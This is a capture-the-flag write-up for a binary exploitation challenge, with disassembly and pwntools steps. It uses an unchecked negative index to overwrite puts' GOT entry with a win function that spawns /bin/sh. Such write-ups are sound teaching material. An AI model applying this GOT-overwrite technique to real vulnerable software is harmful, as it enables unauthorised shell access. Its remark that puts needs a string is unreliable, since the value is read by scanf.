# Chall_08

## Solution

If we run ```checksec``` we find ```No pie``` and ```Partial Relro```

Then we open the file with radare and we are given a value of ```0x404050``` as an ```obj.target``` We also see that we have a ```win``` function we want to get to. 
We also see that before this value ```rax``` is multiplied by 8. A crucial part of this is that there is a ```puts``` in ```main``` later on so we need to calculate the distance between our value and ```puts```. 

```assembly
144: int main (int argc, char **argv, char **envp);                                                                                        
│           ; var int64_t var_14h @ rbp-0x14                                                                                                 
│           ; var int64_t var_10h @ rbp-0x10                                                                                                 
│           ; var int64_t var_8h @ rbp-0x8                                                                                                   
│           0x00401196      f30f1efa       endbr64                                                                                           
│           0x0040119a      55             push rbp                                                                                          │           0x0040119b      4889e5         mov rbp, rsp                                                                                      
│           0x0040119e      4883ec20       sub rsp, 0x20                                                                                     │           0x004011a2      64488b042528.  mov rax, qword fs:[0x28]                                                                          
│           0x004011ab      488945f8       mov qword [var_8h], rax                                                                           
│           0x004011af      31c0           xor eax, eax                                                                                      
│           0x004011b1      488d45f0       lea rax, [var_10h]                                                                                
│           0x004011b5      4889c6         mov rsi, rax                                                                                      
│           0x004011b8      488d3d450e00.  lea rdi, [0x00402004]       ; "%ld"                                                               
│           0x004011bf      b800000000     mov eax, 0                                                                                        
│           0x004011c4      e8d7feffff     call sym.imp.__isoc99_scanf ;[1] ; int scanf(const char *format)                                  
│           0x004011c9      488d45ec       lea rax, [var_14h]                                                                                
│           0x004011cd      4889c6         mov rsi, rax                                                                                      
│           0x004011d0      488d3d310e00.  lea rdi, [0x00402008]       ; "%d"                                                                
│           0x004011d7      b800000000     mov eax, 0                                                                                        
│           0x004011dc      e8bffeffff     call sym.imp.__isoc99_scanf ;[1] ; int scanf(const char *format)                                  
│           0x004011e1      8b45ec         mov eax, dword [var_14h]                                                                          
│           0x004011e4      4898           cdqe                                                                                              
│           0x004011e6      488d14c50000.  lea rdx, [rax*8]                                                                                  
│           0x004011ee      488d055b2e00.  lea rax, obj.target         ; 0x404050                                                            
│           0x004011f5      4801c2         add rdx, rax                                                                                      
│           0x004011f8      488b45f0       mov rax, qword [var_10h]                                                                          
│           0x004011fc      488902         mov qword [rdx], rax                                                                              
│           0x004011ff      488d3d050e00.  lea rdi, str.Is_this_even_vulnerable_    ; 0x40200b ; "Is this even vulnerable?"                  
│           0x00401206      e865feffff     call sym.imp.puts           ;[2] ; int puts(const char *s)                                        
│           0x0040120b      b800000000     mov eax, 0                                                                                        
│           0x00401210      488b4df8       mov rcx, qword [var_8h]                                                                           
│           0x00401214      6448330c2528.  xor rcx, qword fs:[0x28]                                                                          
│       ┌─< 0x0040121d      7405           je 0x401224                                                                                       
│       │   0x0040121f      e85cfeffff     call sym.imp.__stack_chk_fail ;[3] ; void __stack_chk_fail(void)                                  
│       └─> 0x00401224      c9             leave                                                                                             
└           0x00401225      c3             ret                                                                                               
┌ 23: sym.win ();                                                                                                                            
│           0x00401226      f30f1efa       endbr64                                                                                           
│           0x0040122a      55             push rbp                                                                                          
│           0x0040122b      4889e5         mov rbp, rsp                                                                                      
│           0x0040122e      488d3def0d00.  lea rdi, str._bin_sh        ; 0x402024 ; "/bin/sh"                                                
│           0x00401235      e856feffff     call sym.imp.system         ;[4] ; int system(const char *string)                                 
│           0x0040123a      90             nop                                                                                               
│           0x0040123b      5d             pop rbp                                                                                           
└           0x0040123c      c3             ret                                                                                               
            0x0040123d      0f1f00         nop dword [rax]  
```

We set up ELF with ```elf=ELF("./chall_08")``` and then if we ```elf.got``` we can see all the dynamically linked functions which in our case includes the address of ```puts```. So If we ```0x404050 - elf.got.puts``` we get ```56```. And since we already know what it was multiplied with we can divide by 8 and get ```7```, well its ```-7``` since it comes before and not after. The thing about puts is that it works with strings so we need to send the win address in the form of a string. So our payload will look like ```p.sendline(str(elf.sym.win))``` and then ```p.sendline("-7")```. And finally with ```interactive()``` we get our shell. 
